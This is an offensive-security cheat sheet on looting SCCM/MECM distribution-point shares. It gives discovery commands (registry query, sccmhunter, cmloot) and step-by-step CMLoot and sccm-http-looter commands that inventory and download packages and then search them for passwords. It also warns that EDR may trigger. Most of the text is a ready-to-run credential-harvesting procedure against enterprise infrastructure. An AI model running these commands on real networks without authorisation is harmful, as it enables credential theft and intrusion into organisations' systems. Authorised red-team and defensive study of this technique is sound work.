**SCCM Distribution Point looting** — SCCM / MECM distribution-point shares often contain credentials in configuration files, MSI packages, or PowerShell scripts. The Content Library has a complex structure that a normal file browser cannot read, so use dedicated tools.

## Discovery

Identify the Distribution Point from a domain-joined machine:

```powershell

(Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\SMS\DP -Name ManagementPoints).ManagementPoints

```

Or from Linux:

```bash

python3 sccmhunter.py find -u 'USER_NAME' -p 'USER_PASS' -d 'DOMAIN' -dc-ip 'DC_IP'
python3 sccmhunter.py show -mps
# or
python3 cmloot.py 'DOMAIN'/'USER_NAME'@'not used' -findsccmservers

```

## Exploitation

### CMLoot (PowerShell)

```powershell

# 1. Inventory available files
Invoke-CMLootInventory -SCCMHost 'DISTRIBUTION_POINT' -outfile sccmfiles.txt
# 2. Download by extension
Invoke-CMLootDownload -InventoryFile '.\sccmfiles.txt' -Extension msi
# Or a single file
Invoke-CMLootDownload -SingleFile '\\DISTRIBUTION_POINT\SCCMContentLib$\DataLib\FILE_PATH'
# 3. Extract MSIs and search for credentials
Invoke-CMLootExtract -Path .\CMLootOut\msi
Get-ChildItem -Recurse *.* | Select-String -Pattern "password"

```

### CMLoot (Python)

```bash

# 1. Inventory
python3 cmloot.py 'DOMAIN'/'USER_NAME':'USER_PASS'@'DISTRIBUTION_POINT' -cmlootinventory sccmfiles.txt
# 2. Download by extension
python3 cmloot.py 'DOMAIN'/'USER_NAME':'USER_PASS'@'DISTRIBUTION_POINT' -cmlootdownload sccmfiles.txt -extensions msi

```

### sccm-http-looter

Covers the case where Anonymous Authentication is enabled on the DP (not the default, but sometimes enabled to work around issues). It downloads a broad set of interesting extensions by default:

```bash

sccmlooter -server 'DISTRIBUTION_POINT'
# Or a specific extension
sccmlooter -server 'DISTRIBUTION_POINT' -allow msi

```

## Caution

**Warning:** EDR or other security software may fire due to the large number of files accessed over SMB.

## References

- CMLoot (PowerShell) - https://github.com/1njected/CMLoot
- CMLoot (Python) - https://github.com/shelltrail/cmloot
- sccm-http-looter - https://github.com/badsectorlabs/sccm-http-looter
- WithSecure - Looting Microsoft Configuration Manager - https://labs.withsecure.com/publications/looting-microsoft-configuration-manager
